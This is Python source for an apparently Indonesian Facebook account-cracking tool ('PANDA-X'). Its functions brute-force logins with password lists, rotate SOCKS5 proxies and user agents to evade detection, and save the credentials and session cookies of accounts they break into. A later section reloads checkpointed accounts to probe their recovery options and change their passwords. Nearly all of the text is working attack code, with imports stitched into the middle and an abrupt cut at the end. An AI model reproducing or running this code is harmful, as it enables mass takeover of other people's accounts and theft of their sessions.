'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idzku,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated h2',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in sound:
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K}{idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
				elif 'ya' in sound:
					os.popen('play-audio scmusic/cepe.mp3')       
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K} {idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'ya' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio scmusic/oke.mp3')       
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}{kuki}{N}{x}')
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				if 'no' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}{kuki}{N}{x}')
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###------------------------------------------------------------------>
#     *METODE API*
###------------------------------------------------------------------>
def ba(idzku,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold white][[bold green]{loop}[bold white] / [bold green]{len(id)}[bold white]]-[OK - [bold green]{ok}[bold white]]:-:[CP - [bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idzku, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.alpha.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.alpha.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in sound:
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K}{idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
				elif 'ya' in sound:
					os.popen('play-audio scmusic/cepe.mp3')       
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K} {idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'ya' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio scmusic/oke.mp3')       
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}{kuki}{N}{x}')
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				if 'no' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}{kuki}{N}{x}')
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###------------------------------------------------------------------>
#     *METHOD ASYNC*
###------------------------------------------------------------------>
def ms(idzku,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold white][[bold green]{loop}[bold white] / [bold green]{len(id)}[bold white]]-[OK - [bold green]{ok}[bold white]]:-:[CP - [bold yellow]{cp}[bold white]][/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idzku, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in sound:
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K}{idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
				elif 'ya' in sound:
					os.popen('play-audio scmusic/cepe.mp3')       
					##tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					##tree.add(Panel.fit(f"""[bold yellow] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					##prints(tree)
					print(f"┗━━{K} {idzku}|{pw}{x}{N}")
					##akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					##akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					##prints(akku)
					open('PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					open('/sdcard/PANDA-X/result-cp/'+rescp,'a').write(idzku+'|'+pw+'\n')
					akun.append(idzku+'|'+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'ya' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio scmusic/oke.mp3')       
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				if 'no' in sound:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					#tree = Tree(Panel.fit(f"""[bold red] - {junzth(idzku)} """,style=f"{color_panel}"),guide_style="bold grey100")
					#tree.add(Panel.fit(f"""[bold green] {idzku}|{pw} """,style=f"{color_panel}"),guide_style="bold grey100")
					#prints(tree)
					print(f"┗━━ {H}{idzku}|{pw}")
					print(f'\r{H}viabrowser;Safary={ua}{N}{x}')
					#akku = Tree(Panel.fit(f"""[bold red] UGENT """,style=f"{color_panel}"),guide_style="bold grey100")
					#akku.add(Panel.fit(f"""[bold cyan]Safari;{ua}""",style=f"{color_panel}"),guide_style="bold grey100")
					#prints(akku)
					open('PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					open('/sdcard/PANDA-X/result-ok/'+resok,'a').write(idzku+'|'+pw+'|'+kuki+'\n')
					cek_apk(session,coki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

###------------------------------------------------------------------>
#     *CEK OPSI CP
###------------------------------------------------------------------>
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [P]
warna = random.choice(acak)
til ="\033[0m ╰─ > "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(P,til,P,P,P))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0mMasukan file [ Contoh %s: %sCP-%s.txt%s ]"%(P,til,P,P,P,waktu,P))
		opsi()
	except IOError:
		print ('%s%s\033[0mFile Tidak Ada'%(P,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mNama file %s> %s"%(P,til,P,P,P))
	if romi == "":
		print(" [+] Isi Yang Benar "%(P,til));jeda(2)
		back()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\033[0mNama File %s\033[0m Tidak Tersedia"%(P,til,romi))
	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(P,til,P))
	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(P,til,P,P,P))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(P,til,P,P,P))
		if len(pw2) <= 5:
			print("%s%s Sandi Minimal 6 Karakter "%(P,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(P,til,P,P,P,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(P,str(nomor),P,P,P,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(P,til,P));jeda(0.07)
	input('%s%s%s[%s Enter%s ]'%(P,til,P,P,P))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(P,til))
		else:
			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,P))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s [+] %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(P,P,P,str(len(cek)),P,P));jeda(0.07)
		if(len(cek)==0):
